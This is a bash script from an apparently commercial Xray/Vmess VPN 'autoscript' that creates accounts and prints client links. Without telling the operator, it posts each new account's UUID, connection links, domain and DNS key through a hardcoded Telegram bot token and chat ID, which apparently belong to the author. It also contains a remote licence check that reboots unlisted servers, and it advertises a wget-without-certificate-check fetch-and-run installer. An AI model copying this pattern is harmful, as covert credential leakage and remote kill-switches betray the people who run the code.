#!/bin/bash
# //====================================================
# //	System Request:Debian 9+/Ubuntu 18.04+/20+
# //	Author:	bhoikfostyahya
# //	Dscription: Xray Menu Management
# //	email: admin@bhoikfostyahya.com
# //  telegram: https://t.me/bhoikfost_yahya
# //====================================================
red='\e[1;31m'
green='\e[0;32m'
NC='\e[0m'
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[32;1m${*}\\033[0m"; }
TIMES="10"
CHATID="5151483288"
KEY="5497008242:AAEr1h9sV_lDCnHLefyxKCnAf8sIA-1YnF4"
URL="https://api.telegram.org/bot$KEY/sendMessage"
domain=$(cat /etc/xray/domain)
PUB=$(cat /etc/slowdns/server.pub)
CITY=$(cat /etc/xray/city)
NS=$(cat /etc/xray/dns)
ftunnel() {
  curl -sS https://sc-xray.yha.my.id/ip >/root/tmp
  data=($(cat /root/tmp | grep -E "^### " | awk '{print $2}'))
  for user in "${data[@]}"; do
    exp=($(grep -E "^### $user" "/root/tmp" | awk '{print $3}'))
    d1=($(date -d "$exp" +%s))
    d2=($(date -d "$dateuser" +%s))
    exp2=$(((d1 - d2) / 86400))
    if [[ "$exp2" -le "0" ]]; then
      echo $user >/etc/.$user.ini
    else
      rm -f /etc/.$user.ini >/dev/null 2>&1
    fi
  done
  rm -f /root/tmp
}
MYIP=$(curl -sS ipv4.icanhazip.com)
Name=$(curl -sS https://sc-xray.yha.my.id/ip | grep $MYIP | awk '{print $2}')
echo $Name >/usr/local/etc/.$Name.ini
CekOne=$(cat /usr/local/etc/.$Name.ini)

itilbau() {
  if [ -f "/etc/.$Name.ini" ]; then
    CekTwo=$(cat /etc/.$Name.ini)
    if [ "$CekOne" = "$CekTwo" ]; then
      res="Expired"
    fi
  else
    res="Permission Accepted..."
  fi
}
ijinhela() {
    MYIP=$(curl -sS ipv4.icanhazip.com)
    IZIN=$(curl -sS https://sc-xray.yha.my.id/ip | awk '{print $4}' | grep $MYIP)
    if [ "$MYIP" = "$IZIN" ]; then
        itilbau
    else
        res="Permission Denied!"
    fi
    ftunnel
}
ijinhela
if [ -f /home/needupdate ]; then
    red "Your script need to update first !"
    reboot
elif [ "$res" = "Permission Accepted..." ]; then
    echo -ne
else

    clear
    echo ""
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e "\033[42m          FIGHTERTUNNEL AUTOSCRIPT          \033[0m"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    echo -e ""
    echo -e "            ${RED}PERMISSION DENIED !${NC}"
    echo -e "   \033[0;33mYour VPS${NC} $MYIP \033[0;33mHas been Banned${NC}"
    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
    echo -e "             \033[0;33mContact Admin :${NC}"
    echo -e "      \033[0;36mTelegram${NC} t.me/bhoikfost_yahya"
    echo -e "      ${green}WhatsApp${NC} wa.me/6281211092868"
    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
    sleep 5
    reboot 0
fi
clear
until [[ $user =~ ^[a-zA-Z0-9_]+$ && ${CLIENT_EXISTS} == '0' ]]; do
  clear
  echo -e "\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
  echo -e "\e[42m         Add Xray/Vmess Account          \E[0m"
  echo -e "\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"

  read -rp "User: " -e user
  CLIENT_EXISTS=$(grep -w $user /etc/xray/config.json | wc -l)

  if [[ ${CLIENT_EXISTS} == '1' ]]; then
    clear
    echo -e "\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
    echo -e "\e[42m         Add Xray/Vmess Account          \E[0m"
    echo -e "\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
    echo ""
    echo "A client with the specified name was already created, please choose another name."
    echo ""
    echo -e "\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
    read -n 1 -s -r -p "Press any key to back on menu"
    menu
  fi
done

uuid=$(cat /proc/sys/kernel/random/uuid)
masaaktif=90
Quota=1
exp=$(date -d "$masaaktif days" +"%Y-%m-%d")
sed -i '/#vmess$/a\### '"$user $exp"'\
},{"id": "'""$uuid""'","alterId": '"0"',"email": "'""$user""'"' /etc/xray/config.json
exp=$(date -d "$masaaktif days" +"%Y-%m-%d")
sed -i '/#vmessgrpc$/a\### '"$user $exp"'\
},{"id": "'""$uuid""'","alterId": '"0"',"email": "'""$user""'"' /etc/xray/config.json
VMESS_WS=`cat<<EOF
      {
      "v": "2",
      "ps": "${user}",
      "add": "${domain}",
      "port": "443",
      "id": "${uuid}",
      "aid": "0",
      "net": "ws",
      "path": "/vmess",
      "type": "none",
      "host": "${domain}",
      "tls": "tls"
}
EOF`
VMESS_NON_TLS=`cat<<EOF
      {
      "v": "2",
      "ps": "${user}",
      "add": "${domain}",
      "port": "80",
      "id": "${uuid}",
      "aid": "0",
      "net": "ws",
      "path": "/vmess",
      "type": "none",
      "host": "${domain}",
      "tls": "none"
}
EOF`
VMESS_GRPC=`cat<<EOF
      {
      "v": "2",
      "ps": "${user}",
      "add": "${domain}",
      "port": "443",
      "id": "${uuid}",
      "aid": "0",
      "net": "grpc",
      "path": "vmess-grpc",
      "type": "none",
      "host": "${domain}",
      "tls": "tls"
}
EOF`
cat >/var/www/html/vmess-$user.txt <<-END
_______________________________________________________
           Thank You For Using Our Services
                Xray/Vmess Account
        Autoscript xray-lite dev bhoikfostyahya
_____________________script v.2_________________________
      System Request:Debian 9+/Ubuntu 18.04+/20+
      Author:	bhoikfostyahya
      Dscription: Xray Menu Management
      email: bhoikfostyahya@gmail.com
      telegram: https://t.me/bhoikfost_yahya
      installer script :
wget --no-check-certificate https://yha.my.id/ub20.sh && chmod +x ub20.sh && ./ub20.sh
_______________________________________________________
              Format Vmess WS (CDN)
_______________________________________________________

- name: Vmess-$user-WS (CDN)
  type: vmess
  server: ${domain}
  port: 443
  uuid: ${uuid}
  alterId: 0
  cipher: auto
  udp: true
  tls: true
  skip-cert-verify: true
  servername: ${domain}
  network: ws
  ws-opts:
    path: /vmess
    headers:
      Host: ${domain}
_______________________________________________________
              Format Vmess WS (CDN) Non TLS
_______________________________________________________

- name: Vmess-$user-WS (CDN) Non TLS
  type: vmess
  server: ${domain}
  port: 80
  uuid: ${uuid}
  alterId: 0
  cipher: auto
  udp: true
  tls: false
  skip-cert-verify: false
  servername: ${domain}
  network: ws
  ws-opts:
    path: /vmess
    headers:
      Host: ${domain}
_______________________________________________________
              Format Vmess gRPC (SNI)
_______________________________________________________

- name: Vmess-$user-gRPC (SNI)
  server: ${domain}
  port: 443
  type: vmess
  uuid: ${uuid}
  alterId: 0
  cipher: auto
  network: grpc
  tls: true
  servername: ${domain}
  skip-cert-verify: true
  grpc-opts:
    grpc-service-name: vmess-grpc

_______________________________________________________
              Link Vmess Account
_______________________________________________________
Link TLS : vmess://$(echo $VMESS_WS | base64 -w 0)
_______________________________________________________
Link none TLS : vmess://$(echo $VMESS_NON_TLS | base64 -w 0)
_______________________________________________________
Link GRPC : vmess://$(echo $VMESS_GRPC | base64 -w 0)
_______________________________________________________



END
vmesslink1="vmess://$(echo $VMESS_WS | base64 -w 0)"
vmesslink2="vmess://$(echo $VMESS_NON_TLS | base64 -w 0)"
vmesslink3="vmess://$(echo $VMESS_GRPC | base64 -w 0)"
TEXT="
<code>───────────────────────────</code>
<code>     Xray/Vmess Account</code>
<code>───────────────────────────</code>
<code>Remarks      : </code><code>${user}</code>
<code>Domain       : </code><code>${domain}</code>
<code>Host XrayDNS : </code><code>${NS}</code>
<code>Pub Key      : </code><code>${PUB}</code>
<code>Location     : </code><code>$CITY</code>
<code>User Quota   : </code><code>${Quota} GB</code>
<code>Port TLS     : 443</code>
<code>Port DNS     : 443, 53</code>
<code>Port NTLS    : 80, 8080, 2086</code>
<code>Port GRPC    : 443</code>
<code>User ID      : </code><code>${uuid}</code>
<code>AlterId      : 0</code>
<code>Security     : auto</code>
<code>Network      : WS or gRPC</code>
<code>Path TLS     : (/multi path)</code>
<code>Path NLS     : (/multi path)</code>
<code>Path Dynamic : http://BUG.COM</code>
<code>ServiceName  : vmess-grpc</code>
<code>───────────────────────────</code>
<code>Link TLS     :</code> 
<code>${vmesslink1}</code>
<code>───────────────────────────</code>
<code>Link NTLS    :</code> 
<code>${vmesslink2}</code>
<code>───────────────────────────</code>
<code>Link GRPC    :</code> 
<code>${vmesslink3}</code>
<code>───────────────────────────</code>
<code>Format OpenClash :</code> https://${domain}:81/vmess-$user.txt
<code>───────────────────────────</code>
<code>Expired On : $exp</code>
"
systemctl restart xray
if [ ! -e /etc/vmess ]; then
  mkdir -p /etc/vmess
fi

if [ -z ${Quota} ]; then
  Quota="0"
fi
c=$(echo "${Quota}" | sed 's/[^0-9]*//g')
d=$((${c} * 1024 * 1024 * 1024))
if [[ ${c} != "0" ]]; then
  echo "${d}" >/etc/vmess/${user}
fi
DATADB=$(cat /etc/vmess/.vmess.db | grep "^###" | grep -w "${user}" | awk '{print $2}')
if [[ "${DATADB}" != '' ]]; then
  sed -i "/\b${user}\b/d" /etc/vmess/.vmess.db
fi
echo "### ${user} ${exp} ${uuid}" >>/etc/vmess/.vmess.db
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
clear
echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/xray/log-create-${user}.log
echo -e "\e[42m    Xray/Vmess Account     \E[0m" | tee -a /etc/xray/log-create-${user}.log
echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/xray/log-create-${user}.log
echo -e "Remarks      : ${user}" | tee -a /etc/xray/log-create-${user}.log
echo -e "Host Server  : ${domain}" | tee -a /etc/xray/log-create-${user}.log
echo -e "Host XrayDNS : ${NS}" | tee -a /etc/xray/log-create-${user}.log
echo -e "Location     : $CITY" | tee -a /etc/xray/log-create-${user}.log
echo -e "User Quota   : ${Quota} GB" | tee -a /etc/xray/log-create-${user}.log
echo -e "Pub Key      : ${PUB}" | tee -a /etc/xray/log-create-${user}.log
echo -e "Port TLS     : 443" | tee -a /etc/xray/log-create-${user}.log
echo -e "Port NTLS    : 80, 8080, 2086" | tee -a /etc/xray/log-create-${user}.log
echo -e "Port DNS     : 443, 53" | tee -a /etc/xray/log-create-${user}.log
echo -e "Port GRPC    : 443" | tee -a /etc/xray/log-create-${user}.log
echo -e "User ID      : ${uuid}" | tee -a /etc/xray/log-create-${user}.log
echo -e "AlterId      : 0" | tee -a /etc/xray/log-create-${user}.log
echo -e "Security     : auto" | tee -a /etc/xray/log-create-${user}.log
echo -e "Network      : WS or gRPC" | tee -a /etc/xray/log-create-${user}.log
echo -e "Path TLS     : (/multi path) " | tee -a /etc/xray/log-create-${user}.log
echo -e "Path NTLS    : (/multi path) " | tee -a /etc/xray/log-create-${user}.log
echo -e "Path Dynamic : http://BUG.COM " | tee -a /etc/xray/log-create-${user}.log
echo -e "ServiceName  : vmess-grpc" | tee -a /etc/xray/log-create-${user}.log
echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/xray/log-create-${user}.log
echo -e "Link TLS     : ${vmesslink1}" | tee -a /etc/xray/log-create-${user}.log
echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/xray/log-create-${user}.log
echo -e "Link NTLS    : ${vmesslink2}" | tee -a /etc/xray/log-create-${user}.log
echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/xray/log-create-${user}.log
echo -e "Link GRPC    : ${vmesslink3}" | tee -a /etc/xray/log-create-${user}.log
echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/xray/log-create-${user}.log
echo -e "Format OpenClash : https://${domain}:81/vmess-$user.txt" | tee -a /etc/xray/log-create-${user}.log
echo -e "\033[1;93m───────────────────────────\033[0m" | tee -a /etc/xray/log-create-${user}.log
echo -e "Expired On : $exp" | tee -a /etc/xray/log-create-${user}.log
echo -e "" | tee -a /etc/xray/log-create-${user}.log
read -n 1 -s -r -p "Press any key to back on menu"

menu
